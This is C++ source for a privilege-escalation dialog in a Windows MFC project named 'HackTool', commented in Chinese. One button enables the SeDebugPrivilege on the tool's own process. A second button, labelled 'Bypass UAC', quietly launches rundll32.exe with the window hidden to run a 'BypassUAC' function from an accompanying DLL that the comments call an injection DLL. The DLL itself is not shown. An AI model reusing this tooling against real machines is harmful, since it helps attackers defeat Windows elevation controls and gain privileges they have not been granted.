// CPrivilgeEscalationDlg.cpp: 实现文件
//

#include "pch.h"
#include "HackTool.h"
#include "CPrivilgeEscalationDlg.h"
#include "afxdialogex.h"


// CPrivilgeEscalationDlg 对话框

IMPLEMENT_DYNAMIC(CPrivilgeEscalationDlg, CDialogEx)

CPrivilgeEscalationDlg::CPrivilgeEscalationDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_PRIVILGEESCALATION_DLG, pParent)
{

}

CPrivilgeEscalationDlg::~CPrivilgeEscalationDlg()
{
}

void CPrivilgeEscalationDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CPrivilgeEscalationDlg, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &CPrivilgeEscalationDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CPrivilgeEscalationDlg::OnBnClickedButton2)
END_MESSAGE_MAP()


// CPrivilgeEscalationDlg 消息处理程序

//提升为Debug权限按钮
void CPrivilgeEscalationDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	if (EnableDebugPrivilege(GetCurrentProcess(), (char*)SE_DEBUG_NAME))
	{
		MessageBox(L"提升为Debug权限成功!");
	}

}

//提权
BOOL CPrivilgeEscalationDlg::EnableDebugPrivilege(HANDLE hProcess, char* pszPrivilegesName)
{
	HANDLE hToken = NULL;
	//令牌权限结构体
	TOKEN_PRIVILEGES tp;
	

	//打开进程令牌并获取进程令牌句柄
	BOOL bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (FALSE == bRet)
	{
		MessageBox(L"打开进程令牌失败！");
		return FALSE;
	}
	//获取本地系统的 pszPrivilegesName 特权的LUID值
	bRet = LookupPrivilegeValue(NULL, (LPCWSTR)pszPrivilegesName, &tp.Privileges[0].Luid);
	if (FALSE == bRet)
	{
		MessageBox(L"获取LUID值失败！");
		CloseHandle(hToken);
		hToken = INVALID_HANDLE_VALUE;
		return FALSE;
	}
	//设置提升权限信息
	//设置新提权的数量
	tp.PrivilegeCount = 1;
	//启用该特权
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//提升进程令牌访问权限
	bRet = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
	if (FALSE == bRet)
	{
		MessageBox(L"提升进程令牌访问权限失败！");
		CloseHandle(hToken);
		hToken = INVALID_HANDLE_VALUE;
		return FALSE;
	}
	else
	{
		//根据错误码判断是否是特权都设置成功
		DWORD dwRet = GetLastError();
		if (ERROR_SUCCESS == dwRet)
		{
			CloseHandle(hToken);
			hToken = INVALID_HANDLE_VALUE;
			return TRUE;
		}
		else if (ERROR_NOT_ALL_ASSIGNED == dwRet)
		{
			MessageBox(L"提升权限失败！，请以管理员身份运行");
			CloseHandle(hToken);
			hToken = INVALID_HANDLE_VALUE;
			return FALSE;
		}
	}
	CloseHandle(hToken);
	hToken = INVALID_HANDLE_VALUE;
	return FALSE;
}

//Bypass UAC
void CPrivilgeEscalationDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码

	//调用rundll32.exe去执行RemoteThreadDll.dll的导出函数 达到BypassUAC
	char szCmdLine[MAX_PATH] = { 0 };
	char szRundll32Path[MAX_PATH] = "C:\\Windows\\System32\\rundll32.exe";

	//获取当前程序所在路径
	char pszFileName[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, pszFileName, MAX_PATH);
	//获取当前程序所在目录
	(strrchr(pszFileName, '\\'))[0] = 0;
	//拼接要注入dll路径
	char pszDllName[MAX_PATH] = { 0 };
	sprintf_s(pszDllName, "%s\\%s", pszFileName, "RemoteThreadDll.dll");
	USES_CONVERSION;
	sprintf_s(szCmdLine, "%s %s %s", szRundll32Path, pszDllName, "BypassUAC");
	WinExec(szCmdLine, SW_HIDE);
}

